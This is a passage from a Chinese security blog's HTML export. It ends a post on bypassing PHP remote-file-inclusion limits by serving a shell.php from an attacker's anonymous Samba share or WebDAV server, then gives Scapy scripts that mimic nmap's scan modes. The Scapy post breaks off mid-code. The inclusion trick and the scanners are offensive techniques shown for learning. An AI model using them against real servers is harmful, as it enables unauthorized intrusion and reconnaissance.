class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = indishell-lab</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line">[ica]</span><br><span class="line">path = /var/www/html/share</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line">read only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></tbody></table></figure><p></p><p>重启<code>smb</code>服务<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service smbd restart</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后访问一下，发现可以正常访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>尝试包含一波，成功包含</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这种方法还是比较局限的，因为这种<code>unc</code>只能是在windows下使用，而且国内的运营商对<code>smb</code>还是比较敏感的，毕竟被勒索病毒搞怕了/捂脸。。。。。</p><h2 id="第二种姿势：利用webdav"><a href="#第二种姿势：利用webdav" class="headerlink" title="第二种姿势：利用webdav"></a>第二种姿势：利用webdav</h2><p><strong> PS：这个思路是Lz1y师傅在ph师傅小密圈提到的，tql </strong></p><p>用docker启动一个webdav服务器（ph师傅给的）<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后把php文件放到<code>~/webdav/data</code>里面</p><p>尝试包含，包含成功<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。<p></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Scapy编写类似于Nmap的端口扫描脚本</title>
      <link href="/2019/04/09/%E8%BF%90%E7%94%A8Scapy%E7%BC%96%E5%86%99%E7%B1%BB%E4%BC%BC%E4%BA%8ENmap%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/04/09/%E8%BF%90%E7%94%A8Scapy%E7%BC%96%E5%86%99%E7%B1%BB%E4%BC%BC%E4%BA%8ENmap%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4704" target="_blank" rel="noopener">https://xz.aliyun.com/t/4704</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Scapy是一种用于计算机网络的数据包处理工具，由Philippe Biondi 用Python编写。它可以伪造或解码数据包，在线路上发送它们，捕获它们，并匹配请求和回复。它还可以处理扫描，跟踪路由，探测，单元测试，攻击和网络发现等任务。可以说Scpay非常强大<br>如果您并不是很了解Scapy，可以自行去看一下官方文档和demo：<a href="https://scapy.readthedocs.io/en/latest/usage.html" title="链接" target="_blank" rel="noopener">链接</a>，因为这篇文章重点不是教您怎么用scapy的，所以这里就不多赘述了。</p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="TCP-Connect扫描"><a href="#TCP-Connect扫描" class="headerlink" title="TCP Connect扫描"></a>TCP Connect扫描</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>TCP Connect扫描又称全连接扫描，此过程客户端会和服务端进行完整的3次握手。假设客户端想与服务端的80端口进行通信，首先客户端会发送一个带有 SYN 标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有 SYN 和 ACK标识的数据包给客户端，随后客户端会发送带有 ACK  和 RST 标识的数据包给服务点，此时客户端与服务器建立了连接。如果端口不开放则会返回一个RST标识的数据包给客户端。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405222422-81f37ff6-57ae-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>代码实现：</p><blockquote><p>nmap的-sT模式</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(argv)</span>:</span></span><br><span class="line">    opts, args = getopt.getopt(argv, <span class="string">"-h:"</span>)</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-h"</span>):</span><br><span class="line">            host=arg</span><br><span class="line">    all_port=[<span class="number">3306</span>,<span class="number">80</span>,<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> all_port:</span><br><span class="line">        send=sr1(IP(dst=host)/TCP(dport=port,flags=<span class="string">"S"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> (send <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] %s %d \033[91m Closed \033[0m"</span> % (host,port)</span><br><span class="line">        <span class="keyword">elif</span> send.haslayer(<span class="string">"TCP"</span>):</span><br><span class="line">            <span class="keyword">if</span> send[<span class="string">"TCP"</span>].flags == <span class="string">"SA"</span>:</span><br><span class="line">                send_1 = sr1(IP(dst=host) / TCP(dport=port, flags=<span class="string">"AR"</span>), timeout=<span class="number">2</span>, verbose=<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] %s %d \033[92m Open \033[0m"</span> % (host, port)</span><br><span class="line">            <span class="keyword">elif</span> send[<span class="string">"TCP"</span>].flags == <span class="string">"RA"</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] %s %d \033[91m Closed \033[0m"</span> % (host,port)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    scan(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></tbody></table></figure><p>扫描结果如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405113642-0767efa6-5754-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h2 id="TCP-SYN扫描"><a href="#TCP-SYN扫描" class="headerlink" title="TCP SYN扫描"></a>TCP SYN扫描</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>TCP SYN扫描又称半开式扫描，该过程不会和服务端建立完整的连接，首先客户端会发送一个带有 SYN 标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有 SYN 和ACK标识的数据包给客户端，随后客户端会返回带有 RST 标识的数据包而不是返回一个带有 ACK 和 RST标识的数据包。如果目标端口处于关闭状态，则服务端会返回一个 RST 标识的数据包。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405222531-aaf7001c-57ae-1.png" alt="image.png"></p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>代码实现，直接把TCP Connect扫描的改一行即可，把标识位改为 R</p><blockquote><p>nmap的-sS模式</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_1 = sr1(IP(dst=host) / TCP(dport=port, flags=<span class="string">"R"</span>), timeout=<span class="number">2</span>, verbose=<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><h2 id="TCP-ACK扫描-大多数情况下用于防火墙检测"><a href="#TCP-ACK扫描-大多数情况下用于防火墙检测" class="headerlink" title="TCP ACK扫描(大多数情况下用于防火墙检测)"></a>TCP ACK扫描(大多数情况下用于防火墙检测)</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ACK 扫描不是用于发现端口开启或关闭状态的，而是用于发现服务器上是否存在有状态防火墙的，它的结果只能说明端口是否被过滤。如果你用nmap -sA就会发现他只会返回两种结果unfiltered和filtered，因为nmap -sA就是ACK扫描的。</p><p>判断端口是否被过滤，分为两种情况：</p><ul><li>发送一个flags为ACK报文，open(开放的)和closed(关闭的) 端口 都会返回RST报文，至于他们是open还是closed状态我们无法确定。不响应的端口，或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)。大致的流程如下图：</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405220235-76a2ea9a-57ab-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><ul><li>上面那种情况下是服务器REJECT掉数据包，所以客户端会有个ICMP包返回，如果是直接DROP掉的话，就会什么也不会返回，所以我们要判断该主机是否存在，因为如果一个主机存在的话，向它发送一个flags为ACK包的话，无论端口是否关闭都会有返回一个flags为RST包，如果是DROP是话就会一个数据包都不会返回，所以我们可以利用这一点去判断端口是否被过滤了，大致流程如下：</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405220808-3d219df6-57ac-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>iptables配置如下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405221110-a98ca6b6-57ac-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>代码实现</p><blockquote><p>nmap -sA模式</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(argv)</span>:</span></span><br><span class="line">    opts, args = getopt.getopt(argv, <span class="string">"-h:"</span>)</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-h"</span>):</span><br><span class="line">            host=arg</span><br><span class="line">    all_port=[<span class="number">3306</span>,<span class="number">80</span>,<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> all_port:</span><br><span class="line">        send=sr1(IP(dst=host)/TCP(dport=port,flags=<span class="string">"A"</span>),timeout=<span class="number">0.5</span>,verbose=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> ping(host)==<span class="number">0</span> <span class="keyword">and</span> send <span class="keyword">is</span> <span class="literal">None</span>: //如果ping不通，则说明该主机处于关闭状态或我们是被过滤了</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] The host is \033[91m Died or filtered\033[0m"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> ping(host) <span class="keyword">and</span> send <span class="keyword">is</span> <span class="literal">None</span>: //如果ping得通且没有数据返回</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] %s %d \033[91m filtered \033[0m"</span> % (host, port)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> send.haslayer(<span class="string">"ICMP"</span>): //返回一个ICMP包</span><br><span class="line">            <span class="keyword">if</span>(send[<span class="string">"ICMP"</span>].type==<span class="number">3</span> <span class="keyword">and</span> (send[<span class="string">"ICMP"</span>].code <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">10</span>,])):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] %s %d \033[91m filtered \033[0m"</span> % (host, port)</span><br><span class="line">        <span class="keyword">elif</span> send[<span class="string">"TCP"</span>].flags==<span class="string">"R"</span>: //返回一个flags为RST的包</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] %s %d \033[91m unfiltered \033[0m"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(host)</span>:</span> //ping判断主机是否存活</span><br><span class="line">    ping=sr1(IP(dst=host)/ICMP(),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ping <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> ping <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    scan(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></tbody></table></figure><p>扫描结果如下，我们可以明显地发现无论是REJECT或DROP都能检测出来</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405221254-e7be6532-57ac-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="TCP-Window扫描"><a href="#TCP-Window扫描" class="headerlink" title="TCP Window扫描"></a>TCP Window扫描</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>它通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed。该扫描依赖于互联网上少数系统的实现细节， <strong>因此您不能永远相信它</strong> 。不支持它的系统会通常返回所有端口closed。 当然，一台机器没有开放端口也是有可能的。 如果大部分被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统就非常可疑了。 偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示1000个开放的端口和3个关闭的或者被过滤的端口， 那么那3个很可能也是开放的端口。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405230731-893c9ecc-57b4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote><p>nmap -sW模式</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(argv)</span>:</span></span><br><span class="line">    opts, args = getopt.getopt(argv, <span class="string">"-h:"</span>)</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-h"</span>):</span><br><span class="line">            host=arg</span><br><span class="line">    all_port=[<span class="number">3306</span>,<span class="number">80</span>,<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> all_port:</span><br><span class="line">        send=sr1(IP(dst=host)/TCP(dport=port,flags=<span class="string">"A"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> (send <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] the host is\033[91m Closed or filtered\033[0m"</span></span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> send.haslayer(<span class="string">"TCP"</span>):</span><br><span class="line">            <span class="keyword">if</span> send[<span class="string">"TCP"</span>].window &gt;<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] %s %d \033[92m Open \033[0m"</span> % (host, port)</span><br><span class="line">            <span class="keyword">elif</span> send[<span class="string">"TCP"</span>].window ==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] %s %d \033[91m Closed \033[0m"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    scan(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></tbody></table></figure><p>结果如下,为什么显示都是closed，这个因为系统的问题，如果你扫描windows的话都会显示open的，如果您认为是我写脚本错了的话，可以用nmap验证一下，<strong> 不建议使用这种模式，除非特殊情况 </strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405230001-7ceb0f10-57b3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405225923-6657c84c-57b3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="TCP-Null扫描"><a href="#TCP-Null扫描" class="headerlink" title="TCP Null扫描"></a>TCP Null扫描</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在发送的数据包中不设置任何标志位(tcp标志头是0)，如果目标端口是开放的则不会回复任何信息。如果目标端口关闭则会返回一个RST+ACK的数据包，我在其它文章看到说是返回一个RST包，但是我用wireshark抓包nmap -sN的过程发现并不是这样子的，返回的是一个flags为RST+ACK的数据包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234850-4ea62804-57ba-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405233409-4146681a-57b8-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h2><blockquote><p>nmap -sN模式</p></blockquote><p>代码实现<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(argv)</span>:</span></span><br><span class="line">    opts, args = getopt.getopt(argv, <span class="string">"-h:"</span>)</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">"-h"</span>):</span><br><span class="line">            host=arg</span><br><span class="line">    all_port=[<span class="number">3306</span>,<span class="number">80</span>,<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> all_port:</span><br><span class="line">        send=sr1(IP(dst=host)/TCP(dport=port,flags=<span class="string">""</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> (send <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] %s  %d \033[91m Open | filtered\033[0m"</span>%(host,port)</span><br><span class="line">        <span class="keyword">elif</span> send.haslayer(<span class="string">"TCP"</span>):</span><br><span class="line">            <span class="keyword">if</span> send[<span class="string">"TCP"</span>].flags==<span class="string">"RA"</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] %s %d \033[92m Closed \033[0m"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    scan(sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></tbody></table></figure><p></p><p>扫描结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405233112-d7d95022-57b7-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="TCP-FIN扫描"><a href="#TCP-FIN扫描" class="headerlink" title="TCP FIN扫描"></a>TCP FIN扫描</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>在发送的数据包中只设置FIN标志位，如果目标端口是开放的则不会回复任何信息。如果目标端口关闭则会返回一个RST+ACK的数据包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234817-3ad8f086-57ba-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><blockquote><p>nmap -sF模式</p></blockquote><p><strong> 将TCP Null扫描发送的标志位改为F即可 </strong><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send=sr1(IP(dst=host)/TCP(dport=port,flags=<span class="string">"F"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>扫描结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234608-ee3ee0fa-57b9-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="TCP-Xmas扫描"><a href="#TCP-Xmas扫描" class="headerlink" title="TCP Xmas扫描"></a>TCP Xmas扫描</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>在发送的数据包中设置PSH,FIN,URG标志位，如果目标端口是开放的则不会回复任何信息。如果目标端口关闭则会返回一个RST+ACK的数据包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405235057-9a0536be-57ba-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h3><blockquote><p>nmap -sX模式</p></blockquote><p><strong> 将TCP Null扫描发送的标志位改为PFU即可 </strong><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send=sr1(IP(dst=host)/TCP(dport=port,flags=<span class="string">"PFU"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>扫描结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234723-1ae01804-57ba-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p>emmmm，这个好像和标题没有什么关系，但是还是挺好用的，所以这里就简单地提及一下。</p><h2 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h2><p>我们还可以用scapy写一个ARP扫描的小脚本，代码实现如下<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(argv)</span>:</span></span><br><span class="line">    opts, args = getopt.getopt(argv, <span 